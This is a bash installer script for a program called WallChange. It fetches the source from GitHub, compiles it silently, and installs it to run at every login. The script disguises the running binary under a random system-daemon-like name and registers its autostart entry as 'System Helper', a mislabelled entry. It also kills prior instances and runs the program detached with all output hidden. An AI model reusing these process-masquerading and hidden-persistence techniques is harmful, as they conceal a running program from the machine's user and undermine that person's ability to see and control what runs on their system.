#!/bin/bash

# Variables
REPO_URL="https://github.com/Zeky69/WallChange.git"
INSTALL_DIR="$HOME/.local/bin"
AUTOSTART_DIR="$HOME/.config/autostart"
CLONE_DIR="$HOME/.wallchange_source"
PROCESS_NAME_FILE="$HOME/.zlsw"

# Fonction pour générer un nom de processus aléatoire
generate_random_name() {
    local prefixes=("sys" "usr" "lib" "dbus" "gvfs" "gnome" "kde" "xdg" "pulseaudio" "pipewire" "session" "desktop" "display" "input" "audio" "video" "notify" "update" "sync" "cache")
    local suffixes=("helper" "daemon" "service" "worker" "monitor" "agent" "manager" "handler" "launcher" "watcher" "server" "client" "bridge" "proxy" "wrapper")
    local prefix=${prefixes[$RANDOM % ${#prefixes[@]}]}
    local suffix=${suffixes[$RANDOM % ${#suffixes[@]}]}
    local random_str=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 4 | head -n 1)
    echo "${prefix}-${suffix}-${random_str}"
}

# 1. Récupération du projet
if [ -d ".git" ] && grep -q "WallChange" .git/config 2>/dev/null; then
    PROJECT_DIR=$(pwd)
else
    if [ -d "$CLONE_DIR" ]; then
        cd "$CLONE_DIR" && git fetch -q && git checkout -q master && git pull -q origin master
    else
        git clone -q -b master "$REPO_URL" "$CLONE_DIR"
        cd "$CLONE_DIR"
    fi
    PROJECT_DIR="$CLONE_DIR"
fi

# 2. Compilation
cd "$PROJECT_DIR"
make clean > /dev/null 2>&1
if make -s > /dev/null 2>&1; then
    :
else
    echo "failed"
    exit 1
fi

# 3. Installation des binaires
mkdir -p "$INSTALL_DIR"
mkdir -p "$AUTOSTART_DIR"

# Arrêter et supprimer l'ancien processus avec nom aléatoire
if [ -f "$PROCESS_NAME_FILE" ]; then
    OLD_PROCESS_NAME=$(cat "$PROCESS_NAME_FILE")
    pkill -f "$OLD_PROCESS_NAME" 2>/dev/null || true
    rm -f "$INSTALL_DIR/$OLD_PROCESS_NAME" 2>/dev/null
fi

# Arrêter le processus wallchange (anciennes installations)
pkill -x wallchange 2>/dev/null || true

sleep 1

NEW_PROCESS_NAME=$(generate_random_name)
echo "$NEW_PROCESS_NAME" > "$PROCESS_NAME_FILE"

# Copier le binaire avec le nom aléatoire (pour autostart)
cp wallchange "$INSTALL_DIR/$NEW_PROCESS_NAME"
chmod +x "$INSTALL_DIR/$NEW_PROCESS_NAME"

# Copier aussi sous le nom wallchange (pour la commande CLI)
cp wallchange "$INSTALL_DIR/wallchange"
chmod +x "$INSTALL_DIR/wallchange"

# 4. Configuration du lancement automatique
cat > "$AUTOSTART_DIR/wallchange.desktop" <<EOF
[Desktop Entry]
Type=Application
Exec=/bin/bash -c 'PNAME=\$(cat $PROCESS_NAME_FILE 2>/dev/null); if [ -n "\$PNAME" ] && [ -f "$INSTALL_DIR/\$PNAME" ]; then "$INSTALL_DIR/\$PNAME"; fi'
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=System Helper
Comment=System session helper
EOF

# 5. Création de l'alias
SHELL_RC="$HOME/.bashrc"
if [[ "$SHELL" == */zsh ]]; then
    SHELL_RC="$HOME/.zshrc"
fi

if ! grep -q "alias wallchange=" "$SHELL_RC" 2>/dev/null; then
    echo "" >> "$SHELL_RC"
    echo "# Alias Wallchange" >> "$SHELL_RC"
    echo "alias wallchange='$INSTALL_DIR/wallchange'" >> "$SHELL_RC"
fi

# Lancer le processus en arrière-plan
nohup "$INSTALL_DIR/$NEW_PROCESS_NAME" > /dev/null 2>&1 &
disown

echo "successful"
